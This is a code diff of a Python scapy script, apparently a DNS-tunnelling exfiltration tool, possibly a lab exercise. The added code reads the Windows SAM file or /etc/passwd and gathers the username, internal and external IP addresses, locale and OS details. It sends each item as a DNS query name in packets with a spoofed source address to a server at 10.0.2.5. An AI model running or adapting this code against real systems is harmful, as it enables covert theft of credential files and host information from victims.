@@ -7,11 +7,8 @@ from scapy.all import *
 from scapy.layers.dns import DNS, DNSQR, DNSRR
 from scapy.layers.inet import UDP, IP
 
-
-
 DNS_port = 53
 DNS_server_ip = "10.0.2.5"
-
 
 
 def client_connection():
@@ -19,6 +16,59 @@ def client_connection():
     query_packet()
     print("client end")
     return
+
+
+def get_username():
+    username = getpass.getuser()
+    return username
+
+
+def get_ip():
+    ip = get("https://api.ipify.org").text
+    return ip
+
+
+def get_internal_ip():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))
+    ip_internal = s.getsockname()[0]
+    s.close()
+
+    return ip_internal
+
+
+def get_password_file():
+    # for windows
+    if os.name == 'nt':
+        fp = open("C:\\Windows\\System32\\config\\sam", "rb")
+        password_file = fp.read()
+        password_file.decode("utf-8", "ignore")
+
+    # for linux
+    else:
+        fp = open("/etc/passwd", "r")
+        password_file = fp.read()
+
+    fp.close()
+
+    return str(password_file)
+
+
+def get_languages():
+    languages = str(locale.locale_alias)
+    return languages
+
+
+def get_os_info():
+    # Get the OS information using os.uname()
+    os_info = os.uname()
+    # Extract relevant information
+    os_name = os_info.sysname
+    os_version = os_info.version
+    os_release = os_info.release
+    os_data = os_name + "" + os_version + "" + os_release
+
+    return os_data
 
 
 def data_to_send():
@@ -37,13 +87,13 @@ def data_to_send():
 
     fp.close()
 
-    #----get ip internal/external----#
+    # ----get ip internal/external----#
     ip = get("https://api.ipify.org").text
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.connect(("8.8.8.8", 80))
     ip_internal = s.getsockname()[0]
     s.close()
-    #--------------------------------#
+    # --------------------------------#
 
     passwords = str(password_file)
 
@@ -64,33 +114,70 @@ def data_to_send():
 
     return data_to_send
 
+
 def query_packet():
-    #-----------------IP Layer---------------#
+    # -----------------IP Layer---------------#
     ip = IP()
     ip.src = "1.2.3.4"
     ip.dst = '10.0.2.5'
-    #----------------------------------------#
+    # ----------------------------------------#
 
-    #-----------------Transport Layer---------------#
+    # -----------------Transport Layer---------------#
     udp = UDP()
     udp.dport = 53
-    #----------------------------------------------
+    # ----------------------------------------------
 
-    #-----------------Application Layer---------------#
+    # -----------------Application Layer---------------#
     dns = DNS()
-    dns.id = random.randint(1, pow(2, 16)-1)
+    dns.id = random.randint(1, pow(2, 16) - 1)
     dns.qr = 0
     dns.opcode = 0
     dns.rd = 1
     dns.qd = DNSQR()
 
-    dns.qd.qname = data_to_send()
-    # ------------------------------------------------#
+    print("Starting to send packets")
 
-    #-----------------The Complete Packet---------------#
+    # Username
+    dns.qd.qname = get_username()
     dns_request = ip / udp / dns
-    #---------------------------------------------------#
     send(dns_request)
+
+    print("Username sent")
+
+    # External IP
+    dns.qd.qname = get_ip()
+    dns_request = ip / udp / dns
+    send(dns_request)
+
+    print("External IP sent")
+
+    # Internal IP
+    dns.qd.qname = get_internal_ip()
+    dns_request = ip / udp / dns
+    send(dns_request)
+
+    print("Internal IP sent")
+
+    # Password file
+    dns.qd.qname = get_password_file()
+    dns_request = ip / udp / dns
+    send(dns_request)
+
+    print("Password file sent")
+
+    # Languages
+    dns.qd.qname = get_languages()
+    dns_request = ip / udp / dns
+    send(dns_request)
+
+    print("Languages sent")
+
+    # OS info
+    dns.qd.qname = get_os_info()
+    dns_request = ip / udp / dns
+    send(dns_request)
+
+    print("OS info sent")
 
 
 if __name__ == "__main__":
